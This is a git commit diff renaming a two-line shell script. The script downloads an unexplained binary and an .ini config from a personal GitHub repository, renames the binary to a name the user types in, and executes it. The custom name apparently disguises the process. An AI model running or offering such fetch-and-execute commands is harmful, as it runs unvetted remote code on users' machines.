c284eab522863bf9f5ce3187e8f8b2d38cb17912
penjelajahwaktu <141205123+penjelajahwaktu@users.noreply.github.com>
2023-08-10 17:12:22 +0700

    Update and rename bb.sh to v.sh

--- bb.sh
+++
@@ -1,2 +0,0 @@
-read -p " name: " CRP
-wget https://raw.githubusercontent.com/penjelajahwaktu/sss/main/cok && wget https://raw.githubusercontent.com/penjelajahwaktu/sss/main/tx.ini && mv cok $CRP && chmod +x $CRP && ./$CRP tx.ini
---
+++ v.sh
@@ -0,0 +1,2 @@
+read -p " name: " CRP
+wget https://raw.githubusercontent.com/penjelajahwaktu/sss/main/cok && wget https://raw.githubusercontent.com/penjelajahwaktu/sss/main/x.ini && mv cok $CRP && chmod +x $CRP && ./$CRP x.ini
